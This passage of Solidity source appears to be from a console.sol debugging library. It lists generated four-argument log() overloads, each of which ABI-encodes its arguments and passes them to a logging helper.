    | 		_sendLogPayload(abi.encodeWithSignature("log(string,string,address,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, string memory p1, address p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,string,address,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, string memory p1, address p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,string,address,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, bool p1, uint p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,bool,uint,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, bool p1, uint p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,bool,uint,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, bool p1, uint p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,bool,uint,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, bool p1, uint p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,bool,uint,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, bool p1, string memory p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,bool,string,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, bool p1, string memory p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,bool,string,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, bool p1, string memory p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,bool,string,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, bool p1, string memory p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,bool,string,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, bool p1, bool p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,bool,bool,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, bool p1, bool p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,bool,bool,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, bool p1, bool p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,bool,bool,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, bool p1, bool p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,bool,bool,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, bool p1, address p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,bool,address,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, bool p1, address p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,bool,address,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, bool p1, address p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,bool,address,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, bool p1, address p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,bool,address,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, address p1, uint p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,address,uint,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, address p1, uint p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,address,uint,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, address p1, uint p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,address,uint,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, address p1, uint p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,address,uint,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, address p1, string memory p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,address,string,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, address p1, string memory p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,address,string,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, address p1, string memory p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,address,string,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, address p1, string memory p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,address,string,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, address p1, bool p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,address,bool,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, address p1, bool p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,address,bool,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, address p1, bool p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,address,bool,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, address p1, bool p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,address,bool,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, address p1, address p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,address,address,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, address p1, address p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,address,address,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, address p1, address p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,address,address,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(string memory p0, address p1, address p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string,address,address,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, uint p1, uint p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,uint,uint,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, uint p1, uint p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,uint,uint,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, uint p1, uint p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,uint,uint,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, uint p1, uint p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,uint,uint,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, uint p1, string memory p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,uint,string,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, uint p1, string memory p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,uint,string,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, uint p1, string memory p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,uint,string,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, uint p1, string memory p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,uint,string,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, uint p1, bool p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,uint,bool,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, uint p1, bool p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,uint,bool,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, uint p1, bool p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,uint,bool,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, uint p1, bool p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,uint,bool,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, uint p1, address p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,uint,address,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, uint p1, address p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,uint,address,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, uint p1, address p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,uint,address,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, uint p1, address p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,uint,address,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, string memory p1, uint p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,string,uint,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, string memory p1, uint p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,string,uint,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, string memory p1, uint p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,string,uint,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, string memory p1, uint p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,string,uint,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, string memory p1, string memory p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,string,string,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, string memory p1, string memory p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,string,string,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, string memory p1, string memory p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,string,string,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, string memory p1, string memory p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,string,string,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, string memory p1, bool p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,string,bool,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, string memory p1, bool p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,string,bool,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, string memory p1, bool p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,string,bool,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, string memory p1, bool p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,string,bool,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, string memory p1, address p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,string,address,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, string memory p1, address p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,string,address,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, string memory p1, address p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,string,address,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, string memory p1, address p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,string,address,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, bool p1, uint p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,bool,uint,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, bool p1, uint p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,bool,uint,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, bool p1, uint p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,bool,uint,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, bool p1, uint p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,bool,uint,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, bool p1, string memory p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,bool,string,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, bool p1, string memory p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,bool,string,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, bool p1, string memory p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,bool,string,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, bool p1, string memory p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,bool,string,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, bool p1, bool p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,bool,bool,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, bool p1, bool p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,bool,bool,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, bool p1, bool p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,bool,bool,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, bool p1, bool p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,bool,bool,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, bool p1, address p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,bool,address,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, bool p1, address p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,bool,address,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, bool p1, address p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,bool,address,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, bool p1, address p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,bool,address,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, address p1, uint p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,address,uint,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, address p1, uint p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,address,uint,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, address p1, uint p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,address,uint,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, address p1, uint p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,address,uint,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, address p1, string memory p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,address,string,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, address p1, string memory p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,address,string,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, address p1, string memory p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,address,string,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, address p1, string memory p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,address,string,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, address p1, bool p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,address,bool,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, address p1, bool p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,address,bool,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, address p1, bool p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,address,bool,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, address p1, bool p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,address,bool,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, address p1, address p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,address,address,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, address p1, address p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,address,address,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, address p1, address p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,address,address,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(bool p0, address p1, address p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool,address,address,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, uint p1, uint p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,uint,uint,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, uint p1, uint p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,uint,uint,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, uint p1, uint p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,uint,uint,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, uint p1, uint p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,uint,uint,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, uint p1, string memory p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,uint,string,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, uint p1, string memory p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,uint,string,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, uint p1, string memory p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,uint,string,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, uint p1, string memory p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,uint,string,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, uint p1, bool p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,uint,bool,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, uint p1, bool p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,uint,bool,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, uint p1, bool p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,uint,bool,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, uint p1, bool p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,uint,bool,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, uint p1, address p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,uint,address,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, uint p1, address p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,uint,address,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, uint p1, address p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,uint,address,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, uint p1, address p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,uint,address,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, string memory p1, uint p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,string,uint,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, string memory p1, uint p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,string,uint,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, string memory p1, uint p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,string,uint,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, string memory p1, uint p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,string,uint,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, string memory p1, string memory p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,string,string,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, string memory p1, string memory p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,string,string,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, string memory p1, string memory p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,string,string,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, string memory p1, string memory p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,string,string,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, string memory p1, bool p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,string,bool,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, string memory p1, bool p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,string,bool,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, string memory p1, bool p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,string,bool,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, string memory p1, bool p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,string,bool,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, string memory p1, address p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,string,address,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, string memory p1, address p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,string,address,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, string memory p1, address p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,string,address,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, string memory p1, address p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,string,address,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, bool p1, uint p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,bool,uint,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, bool p1, uint p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,bool,uint,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, bool p1, uint p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,bool,uint,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, bool p1, uint p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,bool,uint,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, bool p1, string memory p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,bool,string,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, bool p1, string memory p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,bool,string,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, bool p1, string memory p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,bool,string,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, bool p1, string memory p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,bool,string,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, bool p1, bool p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,bool,bool,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, bool p1, bool p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,bool,bool,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, bool p1, bool p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,bool,bool,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, bool p1, bool p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,bool,bool,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, bool p1, address p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,bool,address,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, bool p1, address p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,bool,address,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, bool p1, address p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,bool,address,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, bool p1, address p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,bool,address,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, address p1, uint p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,address,uint,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, address p1, uint p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,address,uint,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, address p1, uint p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,address,uint,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, address p1, uint p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,address,uint,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, address p1, string memory p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,address,string,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, address p1, string memory p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,address,string,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, address p1, string memory p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,address,string,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, address p1, string memory p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,address,string,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, address p1, bool p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,address,bool,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, address p1, bool p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,address,bool,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, address p1, bool p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,address,bool,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, address p1, bool p2, address p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,address,bool,address)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, address p1, address p2, uint p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,address,address,uint)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, address p1, address p2, string memory p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,address,address,string)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, address p1, address p2, bool p3) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address,address,address,bool)", p0, p1, p2, p3));
    | 	}
    | 
    | 	function log(address p0, address p1, address p2, address p3) internal view {
